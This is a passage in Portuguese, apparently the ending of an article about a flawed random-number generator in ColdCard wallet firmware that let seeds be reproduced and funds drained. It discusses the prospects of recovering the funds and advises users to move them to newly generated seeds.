- Os fundos, até onde se sabe, ainda não foram movidos para mixers ou trocas. Enquanto estiverem parados, existe uma janela para congelamento ou recuperação judicial. Assim que forem trocados, misturados ou convertidos em fiat off-shore, a recuperação do ativo fica drasticamente mais difícil.

Ou seja: a thread aponta para uma linha de investigação promissora, mas **é uma alegação em andamento**, não uma prova concluída. Capturar o operador depende de como ele se expôs nos serviços terceirizados, da qualidade dos logs, da jurisdição e da velocidade das autoridades. Recuperar os bitcoins depende de onde as moedas estiverem quando isso acontecer. As duas coisas estão relacionadas, mas não são a mesma coisa.

## Conclusão

Se você ainda tem fundos em uma seed gerada por firmware ColdCard vulnerável, o risco não é teórico. A blockchain já mostra centenas de endereços sendo esvaziados por alguém que reproduziu o RNG defeituoso.

A ColdCard não guarda seus bitcoins. Ela guardava a chave. A chave nasceu fraca. Quem tem uma cópia da mesma chave — obtida enumerando estados de um PRNG — pode assinar transações do seu lado, sem nunca ter tocado no aparelho.

A única defesa é mover os fundos para uma seed nova, gerada por firmware corrigido ou, melhor ainda, por um processo que combine fontes independentes de entropia (dados casino-grade, TRNG de outro fabricante, host offline). E testar a restauração antes de enviar valor relevante.

Não confie em empresa, certificação, influencer ou artigo. Nem neste aqui. Verifique.
